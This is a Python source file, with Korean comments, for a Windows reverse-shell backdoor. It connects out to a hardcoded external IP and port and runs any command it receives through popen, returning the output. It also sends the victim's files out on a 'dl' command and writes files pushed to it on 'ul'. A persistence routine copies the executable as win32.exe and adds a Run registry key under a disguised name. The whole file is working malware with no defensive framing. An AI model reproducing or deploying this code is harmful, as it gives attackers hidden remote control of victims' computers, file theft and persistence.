import socket
import sys
import os
import fnmatch
import time
import shutil
import winreg
from os import popen

#HOST = '118.36.15.58'
HOST='162.157.164.250'
PORT = 10001
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
direct=os.path.dirname( os.path.abspath(sys.argv[0]) )
def main():
    #registerstart()
    global s
    connecting()
    while 1:
        try:
            data = s.recv(2048)
        except ConnectionError:
            s.close() #통신중 에러시 소켓을 초기화 해버린다.
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            connecting()
        else:
            command=data.decode('UTF-8')

            if fnmatch.fnmatch(command,'dl'+'*'): #데이터를 보낸다.
                uploading(command)
            elif fnmatch.fnmatch(command,'ul'+'*'):   #데이터를 받는다.
                downloading(command)
            else : #명령어 실행
                cmd(command)

def uploading(command):
    filename=command[3:]
    try:
        movie = open(filename, "rb")
    except FileNotFoundError:
        s.send(b'nofile')
    else:
        print(filename)
        l = movie.read(2048)
        while l:
            s.send(l)
            l=movie.read(2048)
        time.sleep(0.1)
        s.send(b'finish')
        print('i send finish')
        movie.close()

def downloading(command):
    filename=command[command.rfind('/')+1:]
    file = open(filename,"wb")
    data=s.recv(2048)
    if data==b'nofile':
         pass
    else:
        while 1:
            file.write(data)
            data=s.recv(2048)
            count=+1
            if data==b'finish':
                break
            if(count>50):
                count=0
        file.close()

def cmd(command):
    proc=popen(command)
    value = proc
    p=value.read(2048)
    while p:
        s.send(p.encode('utf-8'))
        p=value.read(2048)
        time.sleep(0.5)
        try:
            s.send(b'finish')
        except ConnectionError:
            connecting()
            pass
    try:
        s.send(b'finish')
    except ConnectionError:
        connecting()
        pass
def connecting():
    while 1:
        try:
            s.connect((HOST,PORT))
        except TimeoutError:
            continue
        except ConnectionError :
            continue
        else:
            pass
            break

def registerstart():
    nowdir=os.path.abspath(sys.executable)[9:]
    user=os.path.abspath(sys.executable)[9:nowdir.find('\\')+9]
    try:
        shutil.copy2(os.path.abspath(sys.executable),'c:\\Users\\'+user+'\\win32.exe')
    except OSError :
        pass

    H_KEY=winreg.HKEY_CURRENT_USER

    reg_path=r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    registry=winreg.ConnectRegistry(None,H_KEY)

    keyval=winreg.CreateKey(registry,reg_path)
    winreg.SetValueEx(keyval,'win32i',0,winreg.REG_SZ,'"'+'c:\\Users\\'+user+'\\win32.exe"')
    winreg.CloseKey(keyval)
    winreg.CloseKey(registry)

def contorl_directory():
    global direct


if __name__ == '__main__':
    main()

s.close()




